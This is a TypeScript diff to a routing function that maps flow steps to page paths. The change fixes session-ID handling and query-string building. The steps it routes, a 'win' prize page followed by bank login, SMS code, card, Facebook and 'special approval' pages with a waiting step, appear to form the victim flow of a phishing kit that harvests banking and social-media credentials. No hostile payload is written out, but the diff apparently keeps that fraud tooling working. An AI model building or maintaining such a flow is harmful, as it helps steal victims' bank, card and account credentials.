@@ -13,7 +13,7 @@ export function stepToPath(
       try {
         const stored = window.localStorage.getItem(ACTIVE_ROUTE_SESSION_STORAGE_KEY)?.trim();
         const active = window.localStorage.getItem(ACTIVE_SESSION_STORAGE_KEY)?.trim();
-        if (stored && active === sessionId) {
+        if (stored && stored !== "undefined" && stored !== "null" && active === sessionId) {
           effectiveRouteSessionId = stored;
         }
       } catch {
@@ -22,37 +22,37 @@ export function stepToPath(
     }
   }
 
-  effectiveRouteSessionId = effectiveRouteSessionId || sessionId;
+  effectiveRouteSessionId = effectiveRouteSessionId || sessionId || "";
 
-  const qs = `session=${encodeURIComponent(effectiveRouteSessionId)}`;
+  const qs = effectiveRouteSessionId ? `?session=${encodeURIComponent(effectiveRouteSessionId)}` : "";
   switch (step) {
     case "code_entry":
-      return `/code?${qs}`;
+      return `/code${qs}`;
     case "win":
-      return `/win/${routeSessionId}`;
+      return `/win/${effectiveRouteSessionId}`;
     case "banken":
-      return `/banken?${qs}`;
+      return `/banken${qs}`;
     case "bank":
     case "bank_login":
-      return `/banken?${qs}`;
+      return `/banken${qs}`;
     case "wait":
-      return `/wait?session=${routeSessionId}`;
+      return `/wait${qs}`;
     case "invalid_bank":
-      return `/invalid-bank?${qs}`;
+      return `/invalid-bank${qs}`;
     case "live_support":
-      return `/live-support?${qs}`;
+      return `/live-support${qs}`;
     case "sms":
-      return `/sms?${qs}`;
+      return `/sms${qs}`;
     case "card":
-      return `/card?${qs}`;
+      return `/card${qs}`;
     case "facebook":
-      return `/facebook?session=${routeSessionId}`;
+      return `/facebook${qs}`;
     case "congrats":
-      return `/congratulations?${qs}`;
+      return `/congratulations${qs}`;
     case "special_approval":
-      return `/special-approval?${qs}`;
+      return `/special-approval${qs}`;
     default:
-      return `/win/${routeSessionId}`;
+      return `/win/${effectiveRouteSessionId}`;
   }
 }
 
